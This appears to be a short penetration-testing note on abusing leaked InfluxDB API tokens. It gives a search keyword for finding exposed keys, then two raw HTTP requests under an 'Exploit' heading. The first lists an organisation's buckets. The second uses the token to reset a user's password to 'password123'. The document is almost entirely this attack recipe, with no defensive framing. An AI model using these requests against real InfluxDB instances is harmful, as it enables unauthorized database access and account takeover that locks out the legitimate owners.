# influx API

## Search

```
influxApiKey
```

## Exploit

View org

```
GET /api/v2/buckets?org= HTTP/1.1
Host: host
Authorization: Token token
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: close
Cache-Control: max-age=0

```

Change user password

```
POST /api/v2/users/id/password HTTP/1.1
Host: host
Authorization: Token token
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 37
Content-Type: application/json;charset=UTF-8

{
  "password": "password123"
}
```



